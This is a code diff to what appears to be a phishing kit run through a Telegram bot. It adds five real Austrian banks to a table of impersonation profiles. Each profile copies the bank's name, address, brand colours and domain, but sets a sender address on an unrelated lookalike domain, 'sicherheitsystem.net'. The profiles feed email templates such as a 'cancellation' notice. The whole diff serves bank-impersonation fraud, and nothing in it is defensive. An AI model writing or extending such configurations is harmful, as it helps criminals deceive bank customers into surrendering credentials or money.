@@ -25,7 +25,12 @@ type BankKey =
   | "oberbank"
   | "dadat"
   | "dolomiten"
-  | "marchfelder";
+  | "marchfelder"
+  | "ba"
+  | "btv"
+  | "bks"
+  | "vkb"
+  | "schelhammer";
 
 type BankConfig = {
   key: BankKey;
@@ -197,7 +202,78 @@ const BANKS: Record<BankKey, BankConfig> = {
     schalter: "Marchfelder-Bank-Schalter",
     filiale: "Marchfelder-Bank-Filiale",
   },
+  ba: {
+    key: "ba",
+    name: "Bank Austria",
+    fullName: "UniCredit Bank Austria AG",
+    fromName: "UniCredit Bank Austria AG",
+    fromEmail: "bankaustria@sicherheitsystem.net",
+    accent: "#E2001A",
+    topbar: "#E2001A",
+    border: "#E2001A",
+    address: "Rothschildplatz 1, 1020 Wien",
+    domain: "bankaustria.at",
+    schalter: "Bank-Austria-Schalter",
+    filiale: "Bank-Austria-Filiale",
+  },
+  btv: {
+    key: "btv",
+    name: "BTV",
+    fullName: "BTV Vier Länder Bank AG",
+    fromName: "BTV Vier Länder Bank AG",
+    fromEmail: "btv@sicherheitsystem.net",
+    accent: "#003366",
+    topbar: "#003366",
+    border: "#003366",
+    address: "Stadtforum 1, 6020 Innsbruck",
+    domain: "btv.at",
+    schalter: "BTV-Schalter",
+    filiale: "BTV-Filiale",
+  },
+  bks: {
+    key: "bks",
+    name: "BKS Bank",
+    fullName: "BKS Bank AG",
+    fromName: "BKS Bank AG",
+    fromEmail: "bks@sicherheitsystem.net",
+    accent: "#005CA9",
+    topbar: "#005CA9",
+    border: "#005CA9",
+    address: "St. Veiter Ring 43, 9020 Klagenfurt",
+    domain: "bks.at",
+    schalter: "BKS-Bank-Schalter",
+    filiale: "BKS-Bank-Filiale",
+  },
+  vkb: {
+    key: "vkb",
+    name: "VKB Bank",
+    fullName: "Volkskreditbank AG",
+    fromName: "Volkskreditbank AG",
+    fromEmail: "vkb@sicherheitsystem.net",
+    accent: "#E30613",
+    topbar: "#E30613",
+    border: "#E30613",
+    address: "Rudigierstraße 5-7, 4020 Linz",
+    domain: "vkb.at",
+    schalter: "VKB-Schalter",
+    filiale: "VKB-Filiale",
+  },
+  schelhammer: {
+    key: "schelhammer",
+    name: "Schelhammer",
+    fullName: "Schelhammer Capital Bank AG",
+    fromName: "Schelhammer Capital Bank AG",
+    fromEmail: "schelhammer@sicherheitsystem.net",
+    accent: "#1a3a5c",
+    topbar: "#1a3a5c",
+    border: "#1a3a5c",
+    address: "Goldschmiedgasse 3, 1010 Wien",
+    domain: "schelhammer.at",
+    schalter: "Schelhammer-Schalter",
+    filiale: "Schelhammer-Filiale",
+  },
 };
+
 
 // ---------- HTML templates ----------
 function stornierungTemplate(b: BankConfig): string {
@@ -336,6 +412,11 @@ const MENU_ORDER: BankKey[] = [
   "dadat",
   "dolomiten",
   "marchfelder",
+  "ba",
+  "btv",
+  "bks",
+  "vkb",
+  "schelhammer",
 ];
 
 async function sendStartMenu(chat_id: number) {
